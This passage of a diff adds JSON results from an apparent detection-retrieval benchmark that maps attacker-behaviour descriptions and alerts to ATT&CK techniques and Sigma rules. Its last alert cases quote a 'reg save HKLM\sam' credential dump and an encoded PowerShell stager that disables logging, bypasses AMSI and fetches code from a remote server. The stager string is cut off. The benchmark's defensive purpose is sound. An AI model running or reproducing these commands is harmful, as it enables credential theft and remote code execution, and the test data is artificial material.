+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 15,
+      "top": [
+        "d059842b-6b9d-4ed1-b5c3-5b89143c6ede",
+        "8518ed3d-f7c9-4601-a26c-f361a4256a0c",
+        "d635249d-86b5-4dad-a8c7-d7272b788586",
+        "99c840f2-2012-46fd-9141-c761987550ef",
+        "2ddef153-167b-4e89-86b6-757a9e65dcac"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes_v2:q06",
+      "query": "A debugger value is set in the Image File Execution Options registry key so another program runs when a system tool starts",
+      "kind": "technique",
+      "gold": [
+        "T1546.012",
+        "T1546.008"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 0.6131471927654584,
+      "n_relevant": 2,
+      "top": [
+        "T1546.012",
+        "T1547.001",
+        "T1574.011",
+        "T1546.001",
+        "T1547"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes_v2:q06",
+      "query": "A debugger value is set in the Image File Execution Options registry key so another program runs when a system tool starts",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1546.012",
+        "T1546.008"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 13,
+      "ndcg5": 0.0,
+      "n_relevant": 60,
+      "top": [
+        "9b0b7ac3-6223-47aa-a3fd-e8f211e637db",
+        "092af964-4233-4373-b4ba-d86ea2890288",
+        "8023f872-3f1d-4301-a384-801889917ab4",
+        "15c7904e-6ad1-4a45-9b46-5fb25df37fd2",
+        "833ef470-fa01-4631-a79b-6f291c9ac498"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes_v2:q07",
+      "query": "The InprocServer32 default value of a COM class is changed to point at a DLL in a user writable folder",
+      "kind": "technique",
+      "gold": [
+        "T1546.015"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1546.015",
+        "T1546.001",
+        "T1559.001",
+        "T1021.003",
+        "T1574.011"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes_v2:q07",
+      "query": "The InprocServer32 default value of a COM class is changed to point at a DLL in a user writable folder",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1546.015"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 0.7860137352654724,
+      "n_relevant": 60,
+      "top": [
+        "790317c0-0a36-4a6a-a105-6e576bf99a14",
+        "81315b50-6b60-4d8f-9928-3466e1022515",
+        "07743f65-7ec9-404a-a519-913db7118a8d",
+        "4f84b697-c9ed-4420-8ab5-e09af5b2345d",
+        "243380fa-11eb-4141-af92-e14925e77c1b"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes_v2:q08",
+      "query": "Documents are compressed into a password protected archive before being sent out of the network",
+      "kind": "technique",
+      "gold": [
+        "T1560.001"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 2,
+      "ndcg5": 0.6309297535714575,
+      "n_relevant": 1,
+      "top": [
+        "T1560",
+        "T1560.001",
+        "T1027.015",
+        "T1560.002",
+        "T1027.013"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes_v2:q08",
+      "query": "Documents are compressed into a password protected archive before being sent out of the network",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1560.001"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 0.6992148198508501,
+      "n_relevant": 13,
+      "top": [
+        "9fbf5927-5261-4284-a71d-f681029ea574",
+        "e2e80da2-8c66-4e00-ae3c-2eebd29f6b6d",
+        "00ba9da1-b510-4f6b-b258-8d338836180f",
+        "a3b5e3e9-1b49-4119-8b8e-0344a01f21ee",
+        "571498c8-908e-40b4-910b-d2369159a3da"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes_v2:q09",
+      "query": "Thousands of files are rewritten with a new extension and a ransom note is dropped in every folder",
+      "kind": "technique",
+      "gold": [
+        "T1486"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 2,
+      "ndcg5": 0.6309297535714575,
+      "n_relevant": 1,
+      "top": [
+        "T1036.006",
+        "T1486",
+        "T1036.007",
+        "T1204.002",
+        "T1485"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes_v2:q09",
+      "query": "Thousands of files are rewritten with a new extension and a ransom note is dropped in every folder",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1486"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 0.3391602052736161,
+      "n_relevant": 10,
+      "top": [
+        "e3f673b3-65d1-4d80-9146-466f8b63fa99",
+        "b4926b47-a9d7-434c-b3a0-adc3fa0bd13e",
+        "1cdd9a09-06c9-4769-99ff-626e2b3991b8",
+        "4b046706-5789-4673-b111-66f25fe99534",
+        "1cf465a1-2609-4c15-9b66-c32dbe4bfd67"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes_v2:q10",
+      "query": "Antivirus real time protection is switched off from a PowerShell command",
+      "kind": "technique",
+      "gold": [
+        "T1685"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 3,
+      "ndcg5": 0.5,
+      "n_relevant": 1,
+      "top": [
+        "T1690",
+        "T1546.013",
+        "T1685",
+        "T1059.001",
+        "T1216.002"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes_v2:q10",
+      "query": "Antivirus real time protection is switched off from a PowerShell command",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1685"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 0.8539316501572937,
+      "n_relevant": 192,
+      "top": [
+        "a7ee1722-c3c5-aeff-3212-c777e4733217",
+        "17769c90-230e-488b-a463-e05c08e9d48f",
+        "1e8a9b4d-3c2a-4f9b-8d1e-7c6a5b4f3d2e",
+        "87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180",
+        "14c71865-6cd3-44ae-adaa-1db923fae5f2"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes_v2:q11",
+      "query": "A firewall rule is added with netsh so that a program can accept inbound connections",
+      "kind": "technique",
+      "gold": [
+        "T1686"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 4,
+      "ndcg5": 0.43067655807339306,
+      "n_relevant": 1,
+      "top": [
+        "T1686.003",
+        "T1546.007",
+        "T1205.001",
+        "T1686",
+        "T1205.002"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes_v2:q11",
+      "query": "A firewall rule is added with netsh so that a program can accept inbound connections",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1686"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 2,
+      "ndcg5": 0.5147714448836774,
+      "n_relevant": 31,
+      "top": [
+        "a70dcb37-3bee-453a-99df-d0c683151be6",
+        "cd5cfd80-aa5f-44c0-9c20-108c4ae12e3c",
+        "347906f3-e207-4d18-ae5b-a9403d6bcdef",
+        "782d6f3e-4c5d-4b8c-92a3-1d05fed72e63",
+        "01aeb693-138d-49d2-9403-c4f52d7d3d62"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes_v2:q12",
+      "query": "An interactive remote desktop session is opened from a workstation to a server using stolen credentials",
+      "kind": "technique",
+      "gold": [
+        "T1021.001"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 3,
+      "ndcg5": 0.5,
+      "n_relevant": 1,
+      "top": [
+        "T1563.002",
+        "T1563",
+        "T1021.001",
+        "T1219",
+        "T1187"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes_v2:q12",
+      "query": "An interactive remote desktop session is opened from a workstation to a server using stolen credentials",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1021.001"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 3,
+      "ndcg5": 0.4468535299918563,
+      "n_relevant": 87,
+      "top": [
+        "1883444f-084b-419b-ac62-e0d0c5b3693f",
+        "52753ea4-b3a0-4365-910d-36cff487b789",
+        "8e5c03fa-b7f0-11ea-b242-07e0576828d9",
+        "954f0af7-62dd-418f-b3df-a84bc2c7a774",
+        "a197e378-d31b-41c0-9635-cfdf1c1bb423"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes_v2:q13",
+      "query": "ntdsutil is used to create a copy of the Active Directory database on a domain controller",
+      "kind": "technique",
+      "gold": [
+        "T1003.003"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1003.003",
+        "T1207",
+        "T1003.006",
+        "T1136.002",
+        "T1087.002"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes_v2:q13",
+      "query": "ntdsutil is used to create a copy of the Active Directory database on a domain controller",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1003.003"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 140,
+      "top": [
+        "2afafd61-6aae-4df4-baed-139fa1f4c345",
+        "a58353df-af43-4753-bad0-cd83ef35eef5",
+        "0b8baa3f-575c-46ee-8715-d6f28cc7d33c",
+        "e6e88853-5f20-4c4a-8d26-cd469fd8d31f",
+        "4e7050dd-e548-483f-b7d6-527ab4fa784d"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes_v2:q14",
+      "query": "A tool takes screenshots of the desktop at regular intervals and saves them to a temp folder",
+      "kind": "technique",
+      "gold": [
+        "T1113"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1113",
+        "T1546.002",
+        "T1125",
+        "T1204.002",
+        "T1564.012"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes_v2:q14",
+      "query": "A tool takes screenshots of the desktop at regular intervals and saves them to a temp folder",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1113"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 0.6548086577531307,
+      "n_relevant": 9,
+      "top": [
+        "dbe4b9c5-c254-4258-9688-d6af0b7967fd",
+        "0afecb6e-6223-4a82-99fb-bf5b981e92a5",
+        "2158f96f-43c2-43cb-952a-ab4580f32382",
+        "d4a11f63-2390-411c-9adf-d791fd152830",
+        "fc4f4817-0c53-4683-a4ee-b17a64bc1039"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes_v2:q15",
+      "query": "A hidden process records every key the user types into a log file",
+      "kind": "technique",
+      "gold": [
+        "T1056.001"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1056.001",
+        "T1564.001",
+        "T1552.003",
+        "T1552.004",
+        "T1564.002"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes_v2:q15",
+      "query": "A hidden process records every key the user types into a log file",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1056.001"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 5,
+      "ndcg5": 0.13120507751234178,
+      "n_relevant": 8,
+      "top": [
+        "d2b7a134-9c3e-4f8a-b56d-e0c1f8a29b47",
+        "1cf465a1-2609-4c15-9b66-c32dbe4bfd67",
+        "2617e7ed-adb7-40ba-b0f3-8f9945fe6c09",
+        "85d23b42-9a9d-4f8f-b3d7-d2733c1d58f5",
+        "49aae26c-450e-448b-911d-b3c13d178dfc"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes_v2:q16",
+      "query": "A legitimate process is started suspended, its memory is unmapped and replaced with different code, then resumed",
+      "kind": "technique",
+      "gold": [
+        "T1055.012"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1055.012",
+        "T1055.003",
+        "T1055.009",
+        "T1564.010",
+        "T1055.013"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes_v2:q16",
+      "query": "A legitimate process is started suspended, its memory is unmapped and replaced with different code, then resumed",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1055.012"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 0.7227265726449519,
+      "n_relevant": 40,
+      "top": [
+        "d2b7a134-9c3e-4f8a-b56d-e0c1f8a29b47",
+        "c4b890e5-8d8c-4496-8c66-c805753817cd",
+        "4cad6c64-d6df-42d6-8dae-eb78defdc415",
+        "f208d6d8-d83a-4c2c-960d-877c37da84e5",
+        "a85f7765-698a-4088-afa0-ecfbf8d01fa4"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes_v2:q17",
+      "query": "The timestamps of a dropped file are changed to match older system files",
+      "kind": "technique",
+      "gold": [
+        "T1070.006"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1070.006",
+        "T1036.006",
+        "T1129",
+        "T1070.004",
+        "T1053.006"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes_v2:q17",
+      "query": "The timestamps of a dropped file are changed to match older system files",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1070.006"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 4,
+      "ndcg5": 0.14606834984270645,
+      "n_relevant": 50,
+      "top": [
+        "8fbf3271-1ef6-4e94-8210-03c2317947f6",
+        "130c9e58-28ac-4f83-8574-0a4cc913b97e",
+        "86157017-c2b1-4d4a-8c33-93b8e67e4af4",
+        "6ddab845-b1b8-49c2-bbf7-1a11967f64bc",
+        "f0540f7e-2db3-4432-b9e0-3965486744bc"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes_v2:q18",
+      "query": "One host connects to many internal addresses on port 445 within a few seconds",
+      "kind": "technique",
+      "gold": [
+        "T1046"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 11,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1568.001",
+        "T1090.003",
+        "T1090.001",
+        "T1205",
+        "T1090.002"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes_v2:q18",
+      "query": "One host connects to many internal addresses on port 445 within a few seconds",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1046"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 19,
+      "top": [
+        "edf3485d-dac4-4d50-90e4-b0e5813f7e60",
+        "297ae038-edc2-4b2e-bb3e-7c5fc94dd5c7",
+        "7b434893-c57d-4f41-908d-6a17bf1ae98f",
+        "aff715fa-4dd5-497a-8db3-910bea555566",
+        "eca91c7c-9214-47b9-b4c5-cb1d7e4f2350"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes_v2:q19",
+      "query": "A host makes many DNS requests with long random looking subdomain labels to a single domain",
+      "kind": "technique",
+      "gold": [
+        "T1071.004"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 5,
+      "ndcg5": 0.38685280723454163,
+      "n_relevant": 1,
+      "top": [
+        "T1568.002",
+        "T1584.001",
+        "T1568.001",
+        "T1583.001",
+        "T1071.004"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes_v2:q19",
+      "query": "A host makes many DNS requests with long random looking subdomain labels to a single domain",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1071.004"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 3,
+      "ndcg5": 0.16958010263680806,
+      "n_relevant": 45,
+      "top": [
+        "195c1119-ef07-4909-bb12-e66f5e07bf3c",
+        "66474410-b883-415f-9f8d-75345a0a66a6",
+        "f8c1e80b-c73a-476a-ae24-6c72528b1521",
+        "aff715fa-4dd5-497a-8db3-910bea555566",
+        "613c03ba-0779-4a53-8a1f-47f914a4ded3"
+      ]
+    },
+    {
+      "task": "text->attack",
+      "case_id": "retrieval_probes_v2:q20",
+      "query": "A command searches the disk for files named password or with key file extensions",
+      "kind": "technique",
+      "gold": [
+        "T1552.001",
+        "T1083"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 0.8503449055347546,
+      "n_relevant": 2,
+      "top": [
+        "T1083",
+        "T1680",
+        "T1565.001",
+        "T1039",
+        "T1552.001"
+      ]
+    },
+    {
+      "task": "text->sigma",
+      "case_id": "retrieval_probes_v2:q20",
+      "query": "A command searches the disk for files named password or with key file extensions",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1552.001",
+        "T1083"
+      ],
+      "platform": null,
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 0.830419897363192,
+      "n_relevant": 68,
+      "top": [
+        "089dbdf6-b960-4bcc-90e3-ffc3480c20f6",
+        "53b1b378-9b06-4992-b972-dde6e423d2b4",
+        "ca94a6db-8106-4737-9ed2-3e3bb826af0a",
+        "d3feb4ee-ff1d-4d3d-bd10-5b28a238cc72",
+        "df3fcaea-2715-4214-99c5-0056ea59eb35"
+      ]
+    },
+    {
+      "task": "alert->attack",
+      "case_id": "day2-006",
+      "query": "C:\\Users\\IT01-Pedro\\Downloads\\payload.exe HKLM\\System\\CurrentControlSet\\Services\\EventLog\\Start DWORD (0x00000004)",
+      "kind": "technique",
+      "gold": [
+        "T1685.001"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": 6,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1547.002",
+        "T1547.001",
+        "T1543.003",
+        "T1547.010",
+        "T1218.011"
+      ]
+    },
+    {
+      "task": "alert->sigma",
+      "case_id": "day2-006",
+      "query": "C:\\Users\\IT01-Pedro\\Downloads\\payload.exe HKLM\\System\\CurrentControlSet\\Services\\EventLog\\Start DWORD (0x00000004)",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1685.001"
+      ],
+      "platform": "windows",
+      "logsource": "registry_set",
+      "first_rank": 14,
+      "ndcg5": 0.0,
+      "n_relevant": 35,
+      "top": [
+        "790317c0-0a36-4a6a-a105-6e576bf99a14",
+        "07743f65-7ec9-404a-a519-913db7118a8d",
+        "46490193-1b22-4c29-bdd6-5bf63907216f",
+        "dc5c24af-6995-49b2-86eb-a9ff62199e82",
+        "9c226817-8dc9-46c2-a58d-66655aafd7dc"
+      ]
+    },
+    {
+      "task": "fields->sigma",
+      "case_id": "day2-006",
+      "query": "Image: C:\\Users\\IT01-Pedro\\Downloads\\payload.exe\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\EventLog\\Start\nDetails: DWORD (0x00000004)",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1685.001"
+      ],
+      "platform": "windows",
+      "logsource": "registry_set",
+      "first_rank": 16,
+      "ndcg5": 0.0,
+      "n_relevant": 35,
+      "top": [
+        "46490193-1b22-4c29-bdd6-5bf63907216f",
+        "dc5c24af-6995-49b2-86eb-a9ff62199e82",
+        "790317c0-0a36-4a6a-a105-6e576bf99a14",
+        "a1e11042-a74a-46e6-b07c-c4ce8ecc239b",
+        "20f0ee37-5942-4e45-b7d5-c5b5db9df5cd"
+      ]
+    },
+    {
+      "task": "alert->attack",
+      "case_id": "day2-014",
+      "query": "C:\\Windows\\System32\\wscript.exe \"C:\\windows\\System32\\WScript.exe\" \"C:\\Users\\pgustavo\\Desktop\\launcher.vbs\"  C:\\Windows\\explorer.exe C:\\windows\\Explorer.EXE",
+      "kind": "technique",
+      "gold": [
+        "T1059.005"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": 4,
+      "ndcg5": 0.43067655807339306,
+      "n_relevant": 1,
+      "top": [
+        "T1547.001",
+        "T1218.011",
+        "T1037.001",
+        "T1059.005",
+        "T1218.014"
+      ]
+    },
+    {
+      "task": "alert->sigma",
+      "case_id": "day2-014",
+      "query": "C:\\Windows\\System32\\wscript.exe \"C:\\windows\\System32\\WScript.exe\" \"C:\\Users\\pgustavo\\Desktop\\launcher.vbs\"  C:\\Windows\\explorer.exe C:\\windows\\Explorer.EXE",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1059.005"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 2,
+      "ndcg5": 0.21398626473452756,
+      "n_relevant": 155,
+      "top": [
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+        "1228c958-e64e-4e71-92ad-7d429f4138ba",
+        "c27515df-97a9-4162-8a60-dc0eeb51b775",
+        "7cce6fc8-a07f-4d84-a53e-96e1879843c9",
+        "438025f9-5856-4663-83f7-52f878a70a50"
+      ]
+    },
+    {
+      "task": "fields->sigma",
+      "case_id": "day2-014",
+      "query": "Image: C:\\Windows\\System32\\wscript.exe\nCommandLine: \"C:\\windows\\System32\\WScript.exe\" \"C:\\Users\\pgustavo\\Desktop\\launcher.vbs\" \nParentImage: C:\\Windows\\explorer.exe\nParentCommandLine: C:\\windows\\Explorer.EXE",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1059.005"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 2,
+      "ndcg5": 0.34519134224686937,
+      "n_relevant": 155,
+      "top": [
+        "0bbc6369-43e3-453d-9944-cae58821c173",
+        "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
+        "c3d76afc-93df-461e-8e67-9b2bad3f2ac4",
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+        "1228c958-e64e-4e71-92ad-7d429f4138ba"
+      ]
+    },
+    {
+      "task": "command->attack",
+      "case_id": "day2-014",
+      "query": "\"C:\\windows\\System32\\WScript.exe\" \"C:\\Users\\pgustavo\\Desktop\\launcher.vbs\" ",
+      "kind": "technique",
+      "gold": [
+        "T1059.005"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": 5,
+      "ndcg5": 0.38685280723454163,
+      "n_relevant": 1,
+      "top": [
+        "T1547.001",
+        "T1037.001",
+        "T1218.011",
+        "T1216.002",
+        "T1059.005"
+      ]
+    },
+    {
+      "task": "alert->attack",
+      "case_id": "day3-045",
+      "query": "C:\\Windows\\System32\\reg.exe \"C:\\windows\\system32\\reg.exe\" save HKLM\\sam sam C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdA